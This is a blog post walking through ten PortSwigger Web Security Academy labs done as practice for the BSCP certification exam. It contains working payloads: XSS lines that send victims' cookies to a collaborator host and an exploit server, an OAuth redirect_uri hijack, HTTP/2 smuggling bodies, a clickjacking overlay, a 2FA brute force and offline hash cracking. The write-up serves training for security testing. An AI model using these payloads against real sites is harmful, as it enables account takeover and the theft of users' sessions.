---
layout: post
title: "Ten Rolls Into Step One: The First Rehearsal for the Exam"
date: 2026-11-25
categories: [web-security, walkthrough]
tags: [portswigger, bscp, mystery-lab, burp-suite, dom-xss, web-cache-poisoning, http-request-smuggling, oauth, clickjacking, broken-authentication, parameter-cloaking, 2fa]
excerpt: "Ten Mystery Pool labs in one sitting, no skips, the first of three dress rehearsals before the exam — and the moment that mattered most wasn't a payload, it was reading a 504 Gateway Timeout as a sign the attack was working, not broken."
lang: en
page_id: ten-rolls-step-one
permalink: /posts/ten-rolls-step-one/
---

A 504 Gateway Timeout stared back at me from Repeater, and for a few seconds I was sure I'd broken something — bad CRLF, bad `Content-Length`, something wrong with the one payload I'd spent twenty minutes building. It hadn't broken. The back-end was doing exactly what I wanted it to do: sitting there with the door open, waiting for bytes that belonged to someone else's request. The reading mistake, not the exploit, was the real lesson of that roll. It happened again two labs later, in a completely different shape.

This is the first of three self-tests before the BSCP exam, one per step: ten [Mystery Pool]({% post_url 2026-10-04-mystery-pool %}) labs rolled back to back, no skipping, repeats included. This one is step one, the foothold. The last time I [rolled through this step]({% post_url 2026-10-28-rolling-labs-until-smuggling %}), I had a single rule — stop as soon as smuggling showed up — and the wheel made me wait nine labs for it. This time there was no stopping condition. I rolled ten, whatever came up, and wrote down what actually happened.

## The rules of the test

All ten foothold topics ticked, Practitioner level: information disclosure, DOM-based vulnerabilities, web cache poisoning, cross-site scripting, clickjacking, HTTP request smuggling, authentication, HTTP Host header attacks, OAuth authentication, WebSockets.

No time limit on any single lab or on the session as a whole — the exam itself gives four hours for two applications and three steps each, and I wanted to see how a clean run actually felt before trying to force that clock onto it. The honest total is "about ninety minutes," not a clean stopwatch number, because I stopped repeatedly to take notes and look things up; most of that time sat in one lab (roll 6), which gets its own long section below. Every lab counts toward the ten, duplicates included — a repeat isn't a free pass, it's the actual measurement of whether solving it the first time taught me anything. Tools: Burp Scanner, Intruder, Repeater, DOM Invader, Param Miner, the HTTP Request Smuggler extension, and my own [BSCP cheatsheet](https://github.com/matteo-brandolino/bscp-exam-notes). No community write-ups, with one exception — roll 6, where I went and read PortSwigger's own solution after misreading a response. That's the whole story of that roll, told properly below.

## Scoreboard

| # | Lab / topic | Repeat? | Time | Outcome |
|---|---|---|---|---|
| 1 | DOM XSS via `postMessage` → `innerHTML` | No | Fast | Solved, no dead ends |
| 2 | DOM XSS via parameter cloaking, delivered via cache poisoning | No | Medium | Solved, one false trail (comment form) |
| 3 | Web cache poisoning, unkeyed `fehost` cookie | **Yes** (2026-10-28) | Fast | Solved, recognized on sight |
| 4 | OAuth account takeover via unvalidated `redirect_uri` | No | Fast | Solved, no dead ends |
| 5 | Broken brute-force protection + username enumeration | No | Medium | Solved |
| 6 | HTTP/2 request smuggling via CRLF injection | No | Slow (the time sink) | Solved, needed the official walkthrough |
| 7 | Stored XSS → stolen `stay-logged-in` cookie, cracked offline | No | Medium | Solved, one abandoned detour |
| 8 | 2FA broken logic via `verify=` cookie | No | Fast | Solved, no dead ends |
| 9 | DOM XSS via `postMessage` (`load-channel`) | **Yes** (2026-10-28) | Fast | Solved, recognized in seconds |
| 10 | Clickjacking to trigger a DOM-based XSS | No | Fast | Solved, first payload worked |

## The session

### Roll 1 — The sink before the hunt (DOM-based XSS)

DOM Invader found this one before I'd read a single line of the page. One sink, `element.innerHTML`, four hits, `Event: message` landing on a `<div id="ads">`. The vulnerable code, once I went looking for it:

```js
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```

No `origin` check, no sanitization — whatever arrives in a `message` event gets written straight into the DOM. The confirmation PoC:

```html
<iframe src="https://TARGET/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

hosted on the exploit server. The `print()` is deliberately loud and safe for a lab — it proves execution without doing anything destructive. In an exam, where you want something you can verify without a dialog sitting in the way, the same gadget becomes a quiet exfiltration:

```html
<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://OASTIFY.COM?collector=`+btoa(document.cookie))>','*')">
```

Swap the alert for a `fetch` to a Collaborator domain, and the victim's cookie leaves the browser base64-encoded in a query string — out-of-band, nothing to dismiss, nothing the victim sees. Stage 1, interactive (needs the victim to load the attacker's page), delivered via the exploit server.

### Roll 2 — The comment form that wasn't it (DOM XSS via parameter cloaking)

I spent the first several minutes on the comment form, because that's where XSS "usually" lives. It wasn't there. The actual signal was sitting in the proxy history the whole time, under a filter I'd set earlier to hide JS requests — the exact kind of self-inflicted blind spot a scanner doesn't have:

```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Cookie: country=[object Object]; session=...
```

An unvalidated JSONP-style `callback` parameter, reflected straight into the script that sets the country cookie. The interesting part wasn't the sink, it was getting a second value into that parameter at all. This is **parameter cloaking**:

```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```

`URLSearchParams` on the client only splits on `&`, so it reads one clean `callback=setCountryCookie`. Some component further down the chain also splits on `;`, and reads a second, hidden `callback=alert(1)` out of what looked like the value of `utm_content`. Two parsers, one query string, two different ideas of where a parameter ends — the same shape that shows up constantly once you start looking for it (filters that decode once versus clients that decode twice, validators that read to an extension versus kernels that read to a null byte).

Delivery here doubled as a second topic: the response was cacheable, so I poisoned it with Repeater instead of needing a direct link to the victim — the cloaked request becomes the cached copy, and every subsequent visitor gets the payload for free. Stage 1, non-interactive once poisoned (no victim action beyond a normal page visit).

### Roll 3 — The wheel repeats itself, on cue (web cache poisoning)

Same lab as [lab 2 from the October 28th run]({% post_url 2026-10-28-rolling-labs-until-smuggling %}): an unkeyed `fehost` cookie, reflected into a JS object literal inside a `<script>` block.

```http
GET / HTTP/2
Cookie: session=...; fehost=someString"-alert(1)-"someString
```

I recognized it the moment the cookie showed up reflected in the response, before even building the payload — that recognition speed is the entire point of rolling the same wheel twice. Confirmed it was unkeyed with a cache buster (a fresh cache-busting parameter plus the poisoned cookie, then a clean follow-up request without the cookie that still came back poisoned). The payload has to stay `"-alert(1)-"` rather than a `//` comment, because a comment would delete the closing `}` the object literal needs to stay syntactically valid — the same lesson the October post already drew, confirmed again under time pressure instead of curiosity. Stage 1, non-interactive once the cache is poisoned.

### Roll 4 — Redirect wherever you like (OAuth account takeover)

The topic spoiled itself: trying to authenticate redirected straight to a social login provider. The authorization request had no validation at all on `redirect_uri`:

```http
GET /auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://example.com&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net
```

Swap `redirect_uri` for a domain you control, and the authorization server hands the `code` to *you* once the victim completes the flow. Delivery, hosted on the exploit server:

```html
<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

The victim, already logged into the OAuth provider, loads the page; their browser is redirected to the attacker's `redirect_uri` with `?code=...` attached, and that request lands in the exploit server's own access log:

```
10.0.3.8  [timestamp] "GET /?code=wWaBVDEktQ25AaMzPSO07yDNWoTQraYb4PYFK2lUIik HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) ..."
```

From there it was a straight swap: intercept my own login attempt at the callback step, replace my code with the victim's stolen one, forward it, log in as the victim. No dead ends — the moment `redirect_uri` came back unvalidated, the rest of the chain followed on its own. Stage 2 (privilege escalation into someone else's account), interactive, delivered via the exploit server.

### Roll 5 — Two headers, two problems (broken authentication)

Known credentials worked; random ones earned a thirty-minute ban after a handful of attempts. The reflex from past rolls kicked in: some header probably bypasses the lockout, and Param Miner's header-guessing scan found it fast — `X-Forwarded-For`. The app trusts that header over the real connecting IP for its lockout counter, so rotating its value resets the ban on every request.

That solves the *blocking*, not the login itself — I still needed a valid username. Intruder, pitchfork attack (parallel payload sets, not every combination), one position on `X-Forwarded-For` and one on the username field, a long fixed wrong password just to generate traffic. One response stood out by length: `arlington`. A second pitchfork pass — `X-Forwarded-For` still rotating, username fixed to `arlington`, a password list in the second position — turned up a `302`. Followed it, logged in. Two separate header-trust problems stacked on top of each other: the lockout trusted a spoofable header, and the username-enumeration tell was sitting in a response-length anomaly, the oldest signal in the book. Stage 1, non-interactive — every step was a direct request, no victim in the loop.

### Roll 6 — The 504 that was actually a yes (HTTP/2 request smuggling via CRLF injection)

This is the lab that ate most of the session, and the reason is entirely on me, not the lab.

Burp's scanner flagged **HTTP request smuggling** — tentative at first, then confirmed — and called the request "kettled": *it contains headers that cannot be fully represented using HTTP/1 syntax*, specifically a newline inside a header value. That warning is the identification tell, and it needs unpacking, because it's the mechanism of the whole lab. HTTP/2 headers are length-prefixed binary fields (HPACK), so a value can legally contain a raw `\r\n` with no special meaning at all — it's just bytes inside a field of known length. The front-end, though, often speaks HTTP/2 to the browser and HTTP/1.1 to the back-end, so at some point it has to serialize that header back into text, where `\r\n` *is* the delimiter between header lines. If it doesn't strip that character before downgrading, the embedded CRLF becomes a real line break in the rewritten request — one request's header value turns into the start of a second, smuggled request that the back-end reads as genuinely separate.

The confirmed lab is PortSwigger's "[HTTP/2 request smuggling via CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection)." The official chain: confirm the search history is tied to the session cookie, set the request to HTTP/2 in Burp's Inspector, add an arbitrary header whose value carries an injected CRLF followed by `Transfer-Encoding: chunked`, then confirm the desync with a minimal chunked body (`0\r\n\r\nSMUGGLED`) — every second request should come back `404`, proof the back-end is appending the next request onto your smuggled prefix.

That confirmation step is where I misread my own tool. I skipped straight to the exploitation-stage body — a smuggled `POST` with `Content-Length: 800` and an 8-byte body (`search=x`) — and sent it directly in Repeater:

```http
0 \r\n
\r\n
POST / HTTP/1.1 \r\n
Host: YOUR-LAB-ID.web-security-academy.net \r\n
Cookie: session=... \r\n
Content-Length: 800 \r\n
\r\n
search=x
```

Repeater gave me a `504 Gateway Timeout`, and for a moment I thought I'd broken the request. I hadn't. `Content-Length: 800` tells the back-end to expect 800 bytes of body; I'd sent 8. The back-end does exactly what the header says — it keeps the connection open, waiting for the missing ~792 bytes, which are supposed to arrive as part of the *next* real request reusing that same back-end connection. Burp's own response-wait timeout eventually gives up and shows a 504 on the smuggling request itself. That timeout isn't a bug report, it's confirmation the desync is working: the connection really is sitting open, mid-body, waiting to swallow someone else's request. The actual signal the lab wants — a `404`, a reflected search term, or the victim's captured request — never shows up in Repeater's response to *this* request at all. It shows up in Burp's embedded browser, on an immediate reload, and in the site's "recent searches" list.

Once I retried with the right timing — send the smuggling `POST`, reload the browser tab right away, check recent searches — the victim's GET request was sitting there, headers included, session cookie and all:

```
xGET / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net ... cookie: victim-fingerprint=...; session=WN2MG7GRjgDeSMWX7hz69GGTmPa8jxM; _lab_analytics=...
```

Replayed that session cookie against the home page, logged in as the victim. Lab solved. The lesson that cost the time: **a timeout from your own tooling is data, not necessarily an error** — when you've deliberately built a request that depends on something else arriving later, a timeout is the expected shape of "it's working, it's just not finished yet." Stage 1, non-interactive on the attacker's own requests, but the final capture needed the victim's normal 15-second reload cycle to supply the missing bytes.

### Roll 7 — The detour that made the shortcut obvious (stored XSS → offline cracking)

This lab opened with a persistent "stay logged in" cookie, format `base64(username:md5(password))` by analogy with my own. First instinct: brute-force it live. Intruder, sniper attack on the whole cookie value, a processing chain of `Hash: MD5 → Add Prefix "carlos:" → Base64-encode`, a small wordlist — and across 100 requests, not a single response matching "Update email," the tell for a successful login as carlos.

The bug wasn't the wordlist. It was a setting I'd left on by habit: "URL-encode these characters" was enabled for that payload position, and the character list included `+`, `/`, and `=` — exactly the characters a Base64 string is built from. That option is useful inside a URL or a form body; it's actively destructive inside a `Cookie` header, because percent-encoding there just corrupts the value before it's sent. Every single candidate — including the correct password, had it been in my list — would have gone out mangled. It's the same shape of mistake as the 504 in roll 6, one lab earlier: a tool doing exactly what I told it to do, at the wrong layer, and me reading the empty result column as "none of these guesses work" instead of "none of my requests are well-formed."

I abandoned the brute force once I found something faster on the same target: a stored XSS in the comment form, no encoding at all on the input. Posted as a comment:

```html
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

carlos loads the page, the script fires, his cookies ride along in the URL to the exploit server's own access log. The first value captured was a plain session token — not crackable, just an opaque identifier. The second was the real target, carlos's `stay-logged-in` cookie:

```
Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

decoding (`base64 -d`) to `carlos:26323c16d5f4dabff3bb136f2460a943` — his username next to his actual password hash, no guessing needed, no server round-trip per attempt. From there it's a dictionary attack against a hash you already hold, which is a different and much faster class of problem than a live brute force:

```bash
hashcat -m 0 -a 0 26323c16d5f4dabff3bb136f2460a943 rockyou.txt
```

Password recovered: `onceuponatime`. Logged in as carlos, deleted the account, which was the lab's actual objective. The full chain — stored XSS to exfiltrate a cookie, decode it, isolate the hash, crack it *offline*, log in with the plaintext — made the earlier brute-force attempt look like exactly what it was: a slower, broken path to a hash I didn't even need to guess at, once a completely different bug handed me the real one. Stage 2 (privilege escalation into carlos's account and beyond, into deleting it), interactive for the delivery (carlos has to load the page with the comment), non-interactive for everything after the cookie lands in the log.

### Roll 8 — A cookie that answers for someone else (2FA broken logic)

The tell was structural: a `verify=` cookie naming whose 2FA code the server should check, sitting right next to an already-valid session cookie.

```http
GET /login2 HTTP/2
Cookie: verify=carlos; session=YOUR-OWN-SESSION
```

Setting `verify` to `carlos` while keeping my own authenticated session triggered the server to generate a *real* 2FA code for carlos — the server trusts the cookie to say whose verification this request concerns, without ever checking it against the user who actually logged in with a password. The code is four digits, ten thousand possible values, and nothing in the flow rate-limits guesses:

```http
POST /login2 HTTP/2
Cookie: verify=carlos; session=YOUR-OWN-SESSION
Content-Type: application/x-www-form-urlencoded

mfa-code=1271
```

A straight Intruder sniper over `mfa-code`, `verify=carlos` held fixed across the whole attack. Code `1271` hit; loading the matching response logged me in as carlos. A clean chain, start to finish, once the cookie's job in the flow was obvious: identity for a privileged step decided by something the client controls, not by what the client proved earlier. Stage 2, non-interactive — the entire attack is requests the attacker sends about someone else's account, no victim action required.

### Roll 9 — Recognition in under a minute (DOM XSS, repeat)

DOM Invader's **Messages** tab, not Sinks this time — seven captured `postMessage` calls, one flagged:

```json
{"type":"load-channel","url":"ij5uthyr0-\<>'\":"}
```

Same shape as [lab 5 from October 28th]({% post_url 2026-10-12-dom-xss-web-messages-javascript-url %}): a message `type` selects a branch that assigns an attacker-controlled `url` straight into an iframe's `src`, no `origin` check and no scheme validation. The exploit:

```html
<iframe src=https://TARGET.web-security-academy.net// onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

Solved on the first attempt. This is the whole argument for rolling the same wheel more than once: the first time, this pattern takes real digging to recognize; the second time, from DOM Invader flag to working payload took under a minute, because the shape was already in my hands. Stage 1, interactive, delivered via the exploit server.

### Roll 10 — The click that wasn't yours (clickjacking to trigger a DOM-based XSS)

The lab name gave away the topic — "Exploiting clickjacking vulnerability to trigger DOM-based XSS" — but not the mechanism, and Burp's scanner confirmed the missing piece immediately: no `X-Frame-Options` or frame-ancestors CSP on `/` or `/feedback`, so either page can be framed.

`/feedback` reads its form fields — `name`, `email`, `subject`, `message` — out of the query string on the client side, which is the tell that this is DOM-based rather than server-reflected (the `#feedbackResult` anchor is JS doing the work on load, not a server template). That means the payload can already be sitting in the iframe's `src` before the victim ever touches the page — the only thing missing is a genuine click to submit the form:

```html
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:610px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://TARGET.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

An almost-invisible iframe (`opacity: 0.0001`, still rendered and clickable, just not visibly so) stacked exactly over a decoy "Click me" div. The victim sees an innocuous prompt; their click actually lands on the framed page's submit button, firing a DOM XSS that needed nothing from them except that one click. First payload, first try. Clickjacking here isn't the bug being proven — it's the delivery mechanism for a sink that would otherwise sit there, armed but unreachable without a genuine user gesture. Stage 1, interactive by definition (clickjacking has no other mode), delivered via a crafted page the victim is lured into visiting.

## The pattern

Two separate dead ends in this run — the 504 in roll 6, the silent URL-encoding corruption in roll 7 — turned out to be the same mistake wearing different clothes: **I misread my own tooling's output as the target failing, when it was actually my own request being malformed or still in flight.** A timeout from a connection deliberately left open mid-body isn't an error, it's the shape of success for that specific attack. A results column with zero matches isn't proof the password list is wrong, it's a reason to go look at what you actually sent. Both times, the fix was the same move: stop reading the summary Burp gives you, and go look at the raw request or response underneath it.

The second thread ties together rolls 2, 4, 5, 7 and 8, and it's the one I'd put at the top of any BSCP authentication cheatsheet: **an application trusting a client-controlled value to answer "who is this?" instead of binding that answer to the session that already authenticated.** A query string decides which `callback` runs (roll 2). A `redirect_uri` decides where an authorization code gets sent (roll 4). An `X-Forwarded-For` header decides whose lockout counter gets incremented (roll 5). A `stay-logged-in` cookie, once stolen, decides who you are without ever touching a password check again (roll 7). A `verify=` cookie decides whose 2FA code gets generated and checked (roll 8). Five different mechanisms, one sentence covers all of them: if identity or scope is decided by something the client sent rather than something the server already verified, that's the first place to push.

And underneath both of those: **delivery is its own problem, separate from the bug.** Four of these ten labs needed a second trick just to get the vulnerability in front of a victim — web cache poisoning carried an XSS to every visitor (rolls 2, 3), clickjacking supplied the one click a DOM sink needed (roll 10), stored XSS doubled as its own delivery mechanism for stealing a cookie (roll 7), and response queue poisoning via smuggling delivered someone else's entire request into your hands (roll 6). The sink is rarely the hard part. Getting it to fire for someone who isn't you is.

## Exam and field

**In the exam**, the identification tells across this run are worth more than any payload: a `postMessage` sink lights up DOM Invader's Sinks or Messages tab before you write anything (rolls 1, 9); an unvalidated `callback=` or `redirect_uri=` is visible the instant you read the request, no tooling needed (rolls 2, 4); a response that differs in length for one username is the oldest enumeration tell there is (roll 5); a scanner calling a request "kettled" is naming the exact mechanism of an HTTP/2 downgrade smuggling bug, not a generic warning (roll 6); and a cookie whose name reads like a verb aimed at someone else — `verify=`, `stay-logged-in=` — is worth asking "whose identity does this actually decide?" before anything else (rolls 7, 8). Seven of the ten rolls are non-interactive once the initial request lands; only the `postMessage` XSS rolls, the OAuth takeover, and clickjacking by definition need a victim in the loop, and all three of those have a clean delivery story (exploit server link, or a lured page) rather than a complicated one. The rabbit holes worth naming: don't read a timeout from your own smuggling attempt as failure without checking what it's actually waiting on; don't assume request encoding settings (URL-encoding, in particular) are safe defaults once a payload position moves into a header instead of a query string; and don't skip the confirmation step of a smuggling attack to jump straight to the exploit-stage request, because the confirmation step is what tells you *what a success even looks like*.

**In the field**, the ranking by blast radius looks different from the ranking by how hard each bug was to find. The OAuth `redirect_uri` bug and the stay-logged-in cookie theft are full account takeovers reachable by anyone who gets a victim to click once; the cache poisoning and clickjacking labs hit every visitor or one targeted click, respectively, with no credential needed at all; the smuggling lab is the rarest precondition (a real front-end/back-end protocol mismatch) but the widest single payoff, since response queue poisoning leaks *other users'* traffic wholesale. The defensive thread that runs through nearly all ten: **never let identity or scope be decided by a value the client sent in this request** — bind it, instead, to whatever the server already verified when the session started.

## What comes next

Two topics in the pool never came up across ten rolls: information disclosure and WebSockets. That's not a judgment on them, just the wheel being a wheel — the next pass through this step should probably weight toward the topics that stayed silent this time. The bigger next step, though, is the second of three tests: ten rolls through BSCP's privilege-escalation step, with the same rule — no skips, duplicates counted, times written down as they happen rather than reconstructed afterward.

## Takeaways

- A timeout from your own request isn't automatically a bug report. If you've built a request that depends on bytes arriving later (a smuggled body with an oversized `Content-Length`), a stalled connection is the *expected* shape of it working — check what it's waiting on before assuming you broke something.
- Encoding settings travel badly between contexts. URL-encoding is safe inside a query string and actively corrupts a Base64 value sitting inside a `Cookie` header — check what a payload position actually sits inside before trusting a tool's default.
- "Who does this value say you are?" is the single most useful question across OAuth, cookies, headers, and 2FA logic. If the answer is "whatever the client just sent," that's the bug.
- Delivery is a separate skill from finding the sink. Cache poisoning, clickjacking, and stored XSS all did the same job in this run: getting a payload in front of someone who isn't you.
- Rolling the same lab twice isn't wasted time — recognition that took real digging the first time took under a minute the second, and that gap is the actual training effect.

## Useful references

- [PortSwigger: HTTP/2 request smuggling via CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection)
- [PortSwigger Web Security Academy: DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) · [Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning) · [OAuth authentication](https://portswigger.net/web-security/oauth) · [Authentication](https://portswigger.net/web-security/authentication) · [Clickjacking](https://portswigger.net/web-security/clickjacking) · [HTTP request smuggling](https://portswigger.net/web-security/request-smuggling)
- [DOM XSS via web messages and a JavaScript URL]({% post_url 2026-10-12-dom-xss-web-messages-javascript-url %})
- [Rolling the whole first step until smuggling]({% post_url 2026-10-28-rolling-labs-until-smuggling %})
- [Mystery Pool]({% post_url 2026-10-04-mystery-pool %})
- [My BSCP exam notes](https://github.com/matteo-brandolino/bscp-exam-notes)

*All techniques shown were performed on an isolated lab environment (PortSwigger's Web Security Academy). Running these attacks against systems you don't own or have written authorization to test is illegal in most jurisdictions.*
